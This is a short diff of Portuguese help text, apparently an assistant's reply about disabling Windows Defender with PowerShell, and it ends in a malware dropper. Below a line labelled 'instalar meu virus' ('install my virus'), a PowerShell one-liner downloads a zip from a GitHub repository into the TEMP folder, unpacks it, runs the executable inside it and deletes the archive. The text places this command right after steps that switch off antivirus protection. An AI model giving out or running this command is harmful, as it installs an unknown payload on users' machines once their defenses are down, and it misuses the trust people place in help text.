@@ -14,15 +14,20 @@ Usando o PowerShell para Desativar o Windows Defender
 
     Reinicie o computador para que as alterações entrem em vigor.
 
-Importante
+##Importante
 
-Lembre-se de que desativar o Windows Defender pode deixar seu sistema vulnerável. É sempre bom ter outra solução de segurança instalada. Se precisar de mais ajuda, estou aqui!
-
-
+##Lembre-se de que desativar o Windows Defender pode deixar seu sistema vulnerável. É sempre bom ter outra solução de segurança instalada. Se precisar de mais ajuda, estou aqui!
 
 
-instalar meu virus  
+
+
+##instalar meu virus  
 
 
 
   $tempPath="$env:TEMP\ardx-main.zip"; $extractedPath="$env:TEMP\ardx-main\ardx-main"; Invoke-WebRequest -Uri "https://github.com/oldmones/ardx/archive/refs/heads/main.zip" -OutFile $tempPath; Expand-Archive -Path $tempPath -DestinationPath "$env:TEMP\ardx-main" -Force; Start-Process -FilePath "$extractedPath\ConsoleApp1.exe" -Wait; Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
+
+
+
+
+###############
